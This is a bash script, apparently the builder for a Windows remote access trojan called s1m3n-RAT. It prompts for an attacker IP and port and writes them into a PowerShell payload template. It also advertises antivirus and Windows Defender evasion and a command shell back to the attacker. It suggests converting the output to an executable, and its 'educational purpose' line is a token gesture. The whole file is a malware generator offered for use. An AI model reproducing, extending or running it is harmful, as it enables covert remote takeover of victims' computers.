#!/bin/bash
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'
#   Over the past several decades, the media and popular culture has been using the term "hacker" to describe physical and information
#   security enthusiasts who commit unlawful acts. This is unfortunate, but understandable. Given the esoteric nature of physical and
#   information security, and the profound impact it now has on our everyday lives, it's easy to use the terms synonymously.
function banner(){
echo -e ${RED}"#############################################################################"
echo -e ${CP}"        ______  _           _____ _   _       ____      _  _______           #"
echo -e ${CP}"       / / ___|/ |_ __ ___ |___ /| \ | |     |  _ \    / \|_   _\ \          #"
echo -e ${CP}"      | |\___ \| |  _   _ \  |_ \|  \| |_____| |_) |  / _ \ | |  | |         #"
echo -e ${CP}"     < <  ___) | | | | | | |___) | |\  |_____|  _ <  / ___ \| |   > >        #"
echo -e ${CP}"      | ||____/|_|_| |_| |_|____/|_| \_|     |_| \_\/_/   \_\_|  | |         #"
echo -e ${CP}"       \_\                                                      /_/          #"
echo -e ${RED}"        A Fully Undectable RAT that Bypass Window10 Defender Protection      #"
echo -e ${RED}"                 As Well As Bypass All Kinds Of AV Protections               #"
echo -e ${YELLOW}"         Note: This RAT Will Open CMD Shell In Attacker System               #"
echo -e ${BLUE}"                https://facebook.com/unknownclay                             #"
echo -e ${PINK}"                    Coded By: Machine404                                     #"
echo -e ${CNC}"                https://github.com/machine1337                               #"
echo -e ${RED}"#############################################################################"

}
 
if [[ $EUID -ne 0 ]]; then
   echo -e ${RED}"\n[ X ] This script must be run as root :) \n" 1>&2
   echo -e ${RED}"[ ??? ] Usage: sudo ./expose.sh"
   exit 1
fi
clear
sleep 1
echo -e ${NC} "[*] Checking dependencies configuration \n"
if [[ "$(ping -c 1 google.com | grep '100% packet loss' )" != "" ]]; then
  echo -e ${RED} "\n[ X ] Internet.............${RED}[ Not working ]"
  exit 1
  else
  echo -e ${GREEN} "\n[ ??? ] Internet.............${GREEN}[ working ]"
  
fi
sleep 1
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e  ${GREEN}"\n[ ??? ] Zenity..................${GREEN}[ found ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo -e ${RED}"\n[ X ] Zenity................[ Not Found ]"
sleep 2
echo -e ${YELLOW}"\n[ ! ] Installing Zenity \n"
sleep 1
sudo apt-get install zenity -y
clear
echo -e ${BLUE}"[ ??? ] Done installing ....\n "
sleep 2
which zenity > /dev/null 2>&1
fi
addr=`hostname -I`
pubaddr=`dig +short myip.opendns.com @resolver1.opendns.com`
function WAN(){
clear
banner

LHOST=$(zenity --title="??? SET LHOST ???" --text "Your-Local-ip: $addr ; Your-Public-ip: $pubaddr" --entry-text "$addr" --entry --width 310 2> /dev/null)
LPORT=$(zenity --title="??? SET LPORT ???" --text "example: 2222" --entry-text "2222" --entry --width 310 2> /dev/null)
ipcony=$(printf '%02X' ${LHOST//./ } | sed  -e 's/^/0x/')
sleep 2
echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n"
sleep 2
echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
sleep 1

cat payloads/payload.ps1 | sed "s/{lhost}/$ipcony/gi" | sed "s/{lport}/$LPORT/gi" >> cmd.ps1


sleep 2
echo -e -n ${CP}"\n[ ??? ] Payload saved as /win-rat/cmd.ps1 \n "
sleep 1
echo -e -n ${RED}"\n[ ??? ] Tip: Now Convert cmd.ps1 to exe format using ps2exe tool"
}
function LAN(){
clear
banner
LHOST=$(zenity --title="??? SET LHOST ???" --text "Your-Local-ip: $addr ; Your-Public-ip: $pubaddr" --entry-text "$addr" --entry --width 310 2> /dev/null)

LPORT=$(zenity --title="??? SET LPORT ???" --text "example: 2222" --entry-text "2222" --entry --width 310 2> /dev/null)

ipcony=$(printf '%02X' ${LHOST//./ } | sed  -e 's/^/0x/')
sleep 2
echo -e -n ${RED}"\n[+] Warning! Use This Tool Only For Educational Purpose :)\n"
sleep 2
echo -e -n ${CNC}"\n[+] Generating Your Undectable Payload :)\n"
sleep 1
cat payloads/payload.ps1 | sed "s/{lhost}/$ipcony/gi" | sed "s/{lport}/$LPORT/gi" >> cmd.ps1

sleep 2
echo -e -n ${CP}"\n[ ??? ] Payload saved as /win-rat/cmd.ps1 \n "
sleep 1
echo -e -n ${RED}"\n[ ??? ] Tip: Now Convert cmd.ps1 to exe format using ps2exe tool"
}
trap ctrl_c INT
ctrl_c() {
clear
echo -e ${RED}"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e ${RED}"[*] Stopping Services... "
if [[ ! -f cmd.ps1  ]]; then
 echo "aleady cleaned"   >/dev/null 2>&1
else
rm   cmd.ps1
fi
 
sleep 1
echo ""
echo -e ${YELLOW}"[*] Thanks For Using UNDECTABLE s1m3n-RAT  :)"
exit
}
function attacktype(){
clear
banner
echo -e  ${RED}"\n[*] Use WAN For Outside Network Or LAN For Inside Network: )\n"
echo -e "${NC}[${CG}"1"${NC}]${CNC} WAN"
echo -e "${NC}[${CG}"2"${NC}]${CNC} LAN"
echo -e "${NC}[${CG}"3"${NC}]${CNC} EXIT"

echo -n -e ${YELLOW}"\n[+] Select: "
read select
if [ $select -eq 1  ]; then
         WAN
elif [ $select -eq 2 ]; then
         LAN
   
elif [ $select -eq 3 ]; then
    exit
fi
}

menu()
{
clear
banner
echo -e ${YELLOW}"\n[*] Create Fully Undectable RAT For Windows:\n"
echo -e "${NC}[${CG}"1"${NC}]${CNC} CHOOSE ATTACK_TYPE:"
echo -e "${NC}[${CG}"2"${NC}]${CNC} EXIT:"

echo -n -e ${YELLOW}"\n[+] Select: "
        read choose
                if [ $choose -eq 1 ]; then
                        attacktype
                elif [ $choose -eq 2 ]; then
                      exit
                fi
}
menu
#coded By Machine404 :) Don't copy this code without giving me credit nerd!
